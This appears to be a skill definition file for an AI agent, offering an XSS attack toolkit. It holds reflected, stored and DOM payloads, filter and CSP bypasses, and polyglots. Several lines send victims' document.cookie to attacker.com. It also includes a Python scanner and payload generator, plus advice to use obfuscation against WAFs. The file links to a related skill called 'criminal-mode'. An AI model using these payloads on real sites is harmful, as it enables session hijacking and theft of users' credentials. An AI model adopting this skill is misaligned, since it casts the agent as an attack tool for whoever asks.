---
name: xss-tools
description: "XSS attacks — reflected, stored, DOM, filter bypass, CSP bypass. 500+ payloads."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [xss, reflected, stored, dom, csp, bypass]
    related_skills: [criminal-mode, exploit-tools, bug-classes]
prerequisites:
  commands: [python]
---

# XSS Attack Tools — Full Spectrum

## When to Load This Skill

User requests:
- "XSS", "cross-site scripting", "reflected", "stored", "DOM XSS"

---

## Reflected XSS

### Basic Payloads (100+)
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>fetch('http://attacker.com?c='+document.cookie)</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<math><mtext></mtext><script>alert(1)</script>
```

### Context Breakout
```html
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
</title><script>alert(1)</script>
"--><script>alert(1)</script>
```

### Attribute Injection
```html
" onmouseover="alert(1)
" onerror="alert(1)
" onload="alert(1)
" onfocus="alert(1)
" onclick="alert(1)
```

### URL Context
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)
```

---

## Stored XSS

### Comment Fields
```html
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">
```

### Profile Fields
```html
<svg onload="new Image().src='http://attacker.com?c='+document.cookie">
```

### File Names
```
<script>alert(1)</script>.jpg
<img src=x onerror=alert(1)>.pdf
```

### Username
```html
<script>alert(document.cookie)</script>
```

---

## DOM XSS

### Sources
```javascript
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage
```

### Sinks
```javascript
eval()
document.write()
innerHTML
outerHTML
insertAdjacentHTML()
location.href
setTimeout()
setInterval()
Function()
```

### Payloads
```html
#<img src=x onerror=alert(1)>
?param=<script>alert(1)</script>
javascript:alert(1)
```

---

## Filter Bypass

### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

### Encoding
```html
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Double Encoding
```
%2527
%253C
%253E
```

### Null Bytes
```html
<scr\x00ipt>alert(1)</scr\x00ipt>
```

### HTML Entities
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">
```

### Unicode
```html
<script>alert(1)</script>
```

---

## CSP Bypass

### Common CSP Bypasses
```html
<!-- If 'unsafe-inline' allowed -->
<script>alert(1)</script>

<!-- JSONP endpoint -->
<script src="https://target.com/jsonp?callback=alert(1)"></script>

<!-- Angular sandbox -->
{{constructor.constructor('alert(1)')()}}

<!-- Script gadget -->
<script src="https://target.com/script.js"></script>
```

### CSP Bypass via Whitelist
```
# Find whitelisted domains
# JSONP endpoints
# CDN with angular/vue
# Open redirect + script
```

---

## Polyglot Payloads

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()/\x3e

"><img src=x onerror=alert(1)>

'"><svg/onload=alert(1)>
```

---

## Python XSS Tools

### XSS Scanner

```python
import requests

PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
]

def scan_xss(url, params):
    results = []
    for param in params:
        for payload in PAYLOADS:
            r = requests.get(f"{url}?{param}={payload}")
            if payload in r.text:
                results.append({
                    'param': param,
                    'payload': payload,
                    'vulnerable': True
                })
    return results
```

### XSS Payload Generator

```python
def generate_payloads(context):
    payloads = {
        'html': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
        'attribute': ['" onerror=alert(1)', '" onload=alert(1)'],
        'url': ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
        'script': ['</script><script>alert(1)</script>', "';alert(1)//"],
    }
    return payloads.get(context, [])
```

### DOM XSS Checker

```python
import re

SOURCES = ['location.hash', 'location.search', 'document.referrer', 'window.name']
SINKS = ['innerHTML', 'document.write', 'eval', 'location.href']

def check_dom_xss(js_code):
    results = []
    for source in SOURCES:
        if source in js_code:
            for sink in SINKS:
                if sink in js_code:
                    results.append({'source': source, 'sink': sink})
    return results
```

---

## Output Format

```json
{
  "url": "https://target.com/search",
  "xss": {
    "type": "reflected",
    "param": "q",
    "payload": "<script>alert(1)</script>",
    "context": "html",
    "vulnerable": true
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Payload escaped | Output encoding | Try different context |
| Script blocked | CSP | Check CSP bypass |
| WAF blocked | Filter | Use encoding/obfuscation |
